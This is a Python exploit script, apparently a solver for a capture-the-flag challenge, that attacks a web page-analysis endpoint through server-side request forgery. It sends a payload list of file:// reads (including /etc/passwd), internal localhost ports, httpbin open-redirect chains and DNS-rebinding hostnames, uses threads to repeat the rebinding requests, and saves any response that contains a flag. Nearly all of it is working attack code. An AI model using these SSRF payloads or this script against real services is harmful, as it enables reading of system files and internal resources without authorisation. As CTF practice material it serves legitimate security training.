import requests
import re
import base64
import hashlib
import time
import os
from concurrent.futures import ThreadPoolExecutor

URL = "https://poiuytrewqazx-csc26.cybersecuritychallenge.al/analizo"

PAYLOADS = [
    # Filesystem (Direct check)
    "file:///flag.txt",
    "file:///flag",
    "file:///etc/flag",
    "file:///etc/passwd",
    "file://C:/flag.txt",
    
    # HTTP Internal Ports/Paths
    "http://127.0.0.1/flag",
    "http://127.0.0.1/key",
    "http://127.0.0.1/robots.txt",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:5000/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:8000/",
    "http://localhost/server-status",
    
    # Redirects to Files/Ports (if allowed)
    "https://httpbin.org/redirect-to?url=http://127.0.0.1/flag",
    "https://httpbin.org/redirect-to?url=http://127.0.0.1:8080",
    
    # DNS Rebinding (User's)
    "http://08080808.7f000001.rbndr.us",
    "http://08080101.7f000001.rbndr.us"
]

seen_img_hashes = set()
seen_html_hashes = set()

def save_artifact(content, ext, label):
    h = hashlib.md5(content).hexdigest()
    
    is_new = False
    if ext == "png":
        if h not in seen_img_hashes:
            seen_img_hashes.add(h)
            is_new = True
    else:
        # Check text hash
        if h not in seen_html_hashes:
            seen_html_hashes.add(h)
            is_new = True
            
    if is_new:
        filename = f"capture_{label}_{h[:8]}.{ext}"
        print(f"[+] NEW {ext.upper()} for {label}! Saved as {filename}")
        with open(filename, "wb") as f:
            f.write(content)
            
        if ext == "html":
            # Quick check for flag
            if b"CSC26" in content or b"flag{" in content.lower():
                print(f"[!!!!] Possible FLAG in {filename}")
                print(content[:500])
        return True
    return False

def attack(payload):
    try:
        # Short label
        label = re.sub(r'[^a-zA-Z0-9]', '', payload)[-15:]
        
        r = requests.post(URL, data={"url": payload, "submit": "Analizo"}, timeout=15)
        
        # 1. Analyze HTML content
        # Filter out the random nonce or time if present? 
        # The result page seems static enough.
        save_artifact(r.content, "html", label)
        
        # 2. Extract Image
        match = re.search(r'src="data:image/png;base64,([^"]+)"', r.text)
        if match:
            b64 = match.group(1)
            img_bytes = base64.b64decode(b64)
            save_artifact(img_bytes, "png", label)
        
    except Exception as e:
        pass

def spammer(domain):
    while True:
        attack(domain)
        time.sleep(1)

def main():
    print("Starting Solver V3 (Comprehensive)...")
    
    # 1. Run through list once
    print("--- Phase 1: List Scan ---")
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(attack, p) for p in PAYLOADS if "rbndr" not in p]
        for f in futures:
            f.result()
            
    # 2. Spam Rebinding
    print("\n--- Phase 2: DNS Rebinding Spam ---")
    with ThreadPoolExecutor(max_workers=5) as executor:
        for _ in range(5):
             executor.submit(spammer, PAYLOADS[-2]) # 08080808...
             
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Stop.")

if __name__ == "__main__":
    main()
